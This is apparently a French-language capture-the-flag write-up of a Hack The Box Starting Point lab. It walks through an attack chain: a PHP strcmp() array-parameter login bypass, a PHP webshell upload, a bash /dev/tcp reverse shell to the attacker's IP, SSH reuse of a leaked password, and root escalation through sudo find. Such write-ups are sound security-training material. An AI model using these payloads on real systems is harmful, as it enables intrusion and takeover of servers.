## Lab Title: Meow
- Date: 2025-10-02
- Duration: ~120 minutes

### Platform: HTB – Starting Point > Tier 2

### 1. Scenario Summary
1. Une exploitation de la fonction: **STRCMP()**
2. Utilisation de l'outil: **Burp Suite** pour modifier les paquets: `POST, GET`
3. **Living Off The Land** Technique pour Linux OS avec **GTFOBins**

### 2. Findings
**Enumeration**
1. Comme d'habitude, on commence avec `nmap` pour trouver les port ouverts:
    - Et on a trouvé que deux ports sont ouverts: `22,80`:
    ```code
        22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
2. Quand on a analysé le site Web: `http://10.129.23.23:80` >> on a trouvé `la page de login`:
    - `/login/login.php`

3. Après, on a analysé le dossier:`/login` >> `http://10.129.23.23/login`. Et on a trouvé trois fichiers dans ce dossier: `/login`
    ```code
        config.php
        login.php
        login.php.swp
    ```
4.  Après, on connaît que `login.php.swp` peut-être sauver quelque chose d'intéressant pour nous
    - On fait ça pour télécharger ce fichier: `curl http://$ip/login/login.php.swp --output login.php.swp`

5. Quand on a examiné ce fichier, on a trouvé que la fonction **strcmp()** a été utilisé sur le `backend` de comparer les valeurs: `username et password`
    - `if (strcmp($username, $_POST['username']) == 0)`

6. Après, on fait `dir enumeration: brute forcing` par **gobuster**:
    - Avec cet outil, le défi est de choisir `wordlists` une base des mots: `/wordlists/dirb/big.txt` est le meilleur.
    - `sudo gobuster dir -u http://$ip:80 -w /usr/share/wordlists/dirb/big.txt`
    - On a obtenu ces résultats:
    ```code
        /.htaccess            (Status: 403) [Size: 278]
        /.htpasswd            (Status: 403) [Size: 278]
        /_uploaded            (Status: 301) [Size: 318] [--> http://10.129.95.184/_uploaded/]
        /assets               (Status: 301) [Size: 315] [--> http://10.129.95.184/assets/]
        /forms                (Status: 301) [Size: 314] [--> http://10.129.95.184/forms/]
        /login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]
    ```
    - Parmi ces dossiers, on connaît que `/_uploaded` est potentiellement utilisé pour stocker les fichiers.

7. Pour faire un login, on doit faire `interception` avec **Burp Suite**.
    - Ici, on connaît que **strcmp()** fonction est vulnérable car il utilise `==` pour vérifier la valeur:
    - Comme: `value == 0` >> ici, si `value > NULL` il considere cela comme **correcte**
    - Donc, on essai modifier ce comportement:
        - D'abbord, on faire `interception` dans **Burp Suite** quand on fait `login` avec les données aléatoires.
        - Et on fait ça:
            ```code
                username=admin&password=mypassword
                //change
                username[]=admin&password[]=mypassword
        ```
        - Maintenant, quand `strcmp()` exécute cela, ce variable est `array` et vide >> donc il renvoie **NULL** valeur, qui est égale `NULL == 0`
        - Voilà, il fait `successful login`

**Foothold:**
9. Après, on a obtenu un accèss à la page: `upload.php`
    - On peut télécharger un fichier et il est exécuté
    - On crée `webshell.php`:
    ```code
        <?php echo system($_REQUEST['cmd']); ?>
    ```
    - On connaît que ce fichier est stocké dans cette location: `/_uploaded/webshell.php`
    - Avec cela, on obtient `webshell` sur le site: `http://10.129.23.23/_uploaded/webshell.php?cmd=whoami`
        - Il nous donne la résultat: `www-data`.

    - À ce moment-là, on fait `interception` par **Burp Suite** a fin de modifier le paquet et d'avoir `reverse shell`.
        - C'est `GET` methode on change la à `POST` dans **Burp Suite** >> `Change request method`
        - Après, on modifie le **paquet POST**: avec ce payload:
        ```code
            cmd=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.25/443' 0>&1'

            0 = stdin
            1 = stdout
            2 = stderr
        ```
        - Ici, `>&` >> cela envoie tous les `output` et `error` à ce **TCP Socket**
        - Et, `0>&1` >> ici, `input` prend une duplicate de `output >>>>> &1` qui, l'attaquant envoie
        - Donc, comme ça, reverse shell fonctionne bien
    - Après, avant d'envoyer le paquet POST, on fait `URL Encoding` >> on fait une sélection ce code
        et appuyer `Ctrl+U` >> il fait **URL Encoding** pour notre commande.
    - On fait `listener` >> `nc -lvnp 443`

**Lateral Movement:**
10. Quand on obtient le `reverse shell`,
    - On a trouvé le fichier: `/var/www/html/login/config.php` et là-bas, il y une `password`
        ```code
            username=admin;
            password=thisisagoodpassword;
        ```
        - Et on a trouvé que il y a un utilisateur: `john` >> `ls /home`, donc ce `password` fonctionne bien avec cet utilisateur.

    - On connaît que `22` est ouvert et ça veut dire que on peut utiliser `ssh`
        - `ssh john@10.129.23.23` et le mot de passe qui on a obtenu >> ça marche bien!
    - On a trouvé le drapeau: `/home/john/user.txt`

**Privilege Escalation:**
11. On a besoin des privilèges de **root**. Donc, on teste les privilèges de l'utilisateur actuel: *john* avec cette commande:
    - `sudo -l` >> et on a trouvé que il peut exécuter `/usr/bin/find` avec **les privilèges de root**
    - Donc, maintenant, notre systeme d'exploitation est Linux >> donc on peut utiliser la
        technique: **Living Off The Land** >> pour Linux, il s'appele:
        - **GTFOBins** >> **liste organiséé de binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité locales dans les systèmes mal configurés**
    - Dans cette base, on cherche `find` et trouve cette information:
        ```code
            find . -exec /bin/bash \; -quit
        ```
    - Ici, `-exec` switch est utilisé pour exécuter les commandes
    - Ce process est exécuté avec les privilèges **root** >> tout ce qu'il exécute est commencé avec les privilèges root
    - ça veut dire que `/bin/bash` est exécuté avec les **privilèges de root**.

12. Voilà, on a trouvé le fichier: `/root/root.txt` et ça y est, c'est fini!

### 3. Idea
1. Foothold >> avec une fonction: `strcmp()` >> par `Burp Suite`
2. `Command Execution in URL` avec `PHP` et Après obtenir `reverse shell` en utilisant **Burp Suite**
3. Reverse Shell Payload >> `cmd=/bin/bash -c 'bash -i >& /dev/tcp/ATTAQUANT_IP/PORT' 0>&1`
4. **GTFOBins** pour faire une exploitations avec les **privilèges de l'utilisateur: root**

